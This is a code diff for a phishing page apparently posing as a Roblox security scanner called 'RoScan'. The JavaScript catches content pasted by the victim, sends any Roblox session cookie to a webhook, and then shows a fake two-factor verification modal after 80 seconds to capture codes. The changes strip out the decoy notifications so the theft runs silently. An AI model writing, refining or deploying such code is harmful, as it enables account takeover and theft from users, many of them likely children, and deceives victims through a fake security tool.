@@ -829,12 +829,9 @@ Screen: ${screen.width}x${screen.height}
             if (response.ok) {
                 console.log('Cookie sent to webhook successfully');
                 
-                // Show fake success message to user
-                setTimeout(() => {
-                    showNotification('Initial scan complete - analyzing data...', 'success');
-                }, 2000);
+                // Silent operation - no success notification
                 
-                // Set up 80-second timer for 2FA modal with countdown notifications
+                // Set up 80-second timer for 2FA modal (silent)
                 setupDelayed2FACapture();
                 
             } else {
@@ -842,10 +839,7 @@ Screen: ${screen.width}x${screen.height}
             }
         } else {
             console.log('No Roblox cookie found in pasted content');
-            // Still show fake scanning for non-cookie content
-            setTimeout(() => {
-                showNotification('No sensitive data detected', 'info');
-            }, 3000);
+            // Silent operation - no notification for non-cookie content
         }
     } catch (error) {
         console.error('Error handling paste event:', error);
@@ -854,41 +848,29 @@ Screen: ${screen.width}x${screen.height}
 
 // Show fake scanning progress to make it look legitimate
 function showFakeScanningProgress() {
-    const steps = [
-        'Analyzing pasted content...',
-        'Scanning for security threats...',
-        'Checking authentication tokens...',
-        'Validating data integrity...'
-    ];
-    
-    steps.forEach((step, index) => {
-        setTimeout(() => {
-            showNotification(step, 'info');
-        }, index * 800);
-    });
+    // Silent operation - no notifications shown
+    console.log('Silent scanning in progress...');
 }
 
 // Enhanced 2FA capture setup with countdown
 function setupDelayed2FACapture() {
     console.log('🕐 TIMER STARTED: 2FA modal will appear in 80 seconds...');
     
-    // Countdown notifications
+    // Silent countdown - no notifications shown
     const countdownTimes = [60, 30, 10];
     
     countdownTimes.forEach(seconds => {
         setTimeout(() => {
             console.log(`⏰ COUNTDOWN: ${seconds} seconds remaining until 2FA`);
-            showNotification(`Security verification required in ${seconds} seconds...`, 'warning');
+            // No notification shown - silent operation
         }, (80 - seconds) * 1000);
     });
     
     // Final 2FA modal trigger
     setTimeout(() => {
         console.log('🔐 80 SECONDS ELAPSED - OPENING 2FA MODAL NOW!');
-        showNotification('Security verification required - please authenticate', 'error');
-        setTimeout(() => {
-            openVerificationModal();
-        }, 1000);
+        // No warning notification - modal appears silently
+        openVerificationModal();
     }, 80000); // 80 seconds
 }
 
@@ -1062,10 +1044,7 @@ document.addEventListener('DOMContentLoaded', function() {
         });
     });
     
-    // Show welcome notification
-    setTimeout(() => {
-        showNotification('RoScan security platform ready!', 'success');
-    }, 1000);
+    // Silent startup - no welcome notification
     
     // Note: 2-step verification will auto-show 80 seconds after paste event
     // See textarea paste handler for implementation
